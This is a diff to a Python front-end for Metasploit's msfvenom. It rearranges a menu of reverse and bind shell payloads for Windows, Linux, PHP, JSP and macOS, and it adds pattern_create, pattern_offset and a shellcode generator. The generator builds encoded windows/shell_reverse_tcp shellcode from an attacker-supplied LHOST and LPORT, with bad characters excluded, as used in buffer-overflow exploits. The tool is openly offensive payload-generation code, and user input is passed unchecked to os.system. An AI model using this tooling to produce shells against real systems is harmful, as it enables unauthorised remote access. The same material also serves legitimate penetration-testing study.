@@ -49,29 +49,23 @@ def write_file(path, text):
 
 print('''\033[1;35mLoading Modules:\033[1;m''')
 #animation = ["10%", "20%", "30%", "40%", "50%", "60%", "70%", "80%", "90%", "100%"]
-animation = ["[■■□□□□□□□□□□□□□□□□□□]","[■■■■□□□□□□□□□□□□□□□□]", "[■■■■■■□□□□□□□□□□□□□□]", "[■■■■■■■■□□□□□□□□□□□□]", "[■■■■■■■■■■□□□□□□□□□□]", "[■■■■■■■■■■■■□□□□□□□□]", "[■■■■■■■■■■■■■■□□□□□□]", "[■■■■■■■■■■■■■■■■□□□□]", "[■■■■■■■■■■■■■■■■■■□□]", "[■■■■■■■■■■■■■■■■■■■■]"]
+animation = ["[■■■■□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□]","[■■■■■■■■□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□]", "[■■■■■■■■■■■■□□□□□□□□□□□□□□□□□□□□□□□□□□□□]", "[■■■■■■■■■■■■■■■■□□□□□□□□□□□□□□□□□□□□□□□□]", "[■■■■■■■■■■■■■■■■■■■■□□□□□□□□□□□□□□□□□□□□]", "[■■■■■■■■■■■■■■■■■■■■■■■■□□□□□□□□□□□□□□□□]", "[■■■■■■■■■■■■■■■■■■■■■■■■■■■■□□□□□□□□□□□□]", "[■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■□□□□□□□□]", "[■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■□□□□]", "[■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■]"]
 for i in range(len(animation)):
-    time.sleep(0.1)
+    time.sleep(0.01)
     sys.stdout.write("\r" + animation[i % len(animation)])
     sys.stdout.flush()
 
 print('''\033[1;33m
-1.windows/shell/reverse_tcp
-2.windows/meterpreter/reverse_tcp
-3.windows/x64/meterpreter/reverse_tcp
-4.windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 5
-5.linux/x86/meterpreter/reverse_tcp
-6.linux/x86/meterpreter/bind_tcp
-7.php/meterpreter_reverse_tcp
-8.java/jsp_shell_reverse_tcp > shell.jsp
-9.java/jsp_shell_reverse_tcp > shell.war
-10.cmd/unix/reverse_python
-11.cmd/unix/reverse_bash 
-12.cmd/unix/reverse_perl
-13.osx/x86/shell_reverse_tcp
-14.osx/x86/shell_bind_tcp
-15.Create User [windows]
-16.generic/shell_bind_tcp
+1.windows/shell/reverse_tcp					10.cmd/unix/reverse_python
+2.windows/meterpreter/reverse_tcp				11.cmd/unix/reverse_bash
+3.windows/x64/meterpreter/reverse_tcp				12.cmd/unix/reverse_perl
+4.windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 5	13.osx/x86/shell_reverse_tcp
+5.linux/x86/meterpreter/reverse_tcp				14.osx/x86/shell_bind_tcp
+6.linux/x86/meterpreter/bind_tcp				15.Create User [windows]
+7.php/meterpreter_reverse_tcp					16.generic/shell_bind_tcp
+8.java/jsp_shell_reverse_tcp > shell.jsp			17.Pattern_create
+9.java/jsp_shell_reverse_tcp > shell.war			18.Pattern_offset
+19.Shell Code Generate
 \033[1;m''')
 
 
@@ -258,3 +252,26 @@ if selection == 16:
 	os.system(cmd)
 
 	print('''\033[1;36mPAYLOAD GETENRATED!!!!!!!\033[1;m''')
+
+#============================================ For Payload 17 in selection ===================
+if selection == 17:
+	
+	char = input("Enter the length of char you want to generate! : ")
+	cmd = "/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l %s" %char
+	os.system(cmd)
+
+#============================================ For Payload 18 in selection ===================
+if selection == 18:
+	
+	char = input("Enter the JMP-EIP! : ")
+	cmd = "/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q %s" %char
+	os.system(cmd)
+
+#============================================ For Payload 19 in selection ===================
+if selection == 19:
+
+	print ('''\033[1;35mUsage Enter LHOST, LPORT, BadChar: eth0 1234 {bad chars...}\033[1;m''')
+	lhost, lport, badchars = input("Enter LHOST, LPORT, BadChar:").split()
+	cmd="msfvenom -a x86 -p windows/shell_reverse_tcp LHOST={0} LPORT={1} -f python -e x86/shikata_ga_nai -i 5 -b '{2}' ".format(lhost, lport, badchars)
+	os.system(cmd)
+	
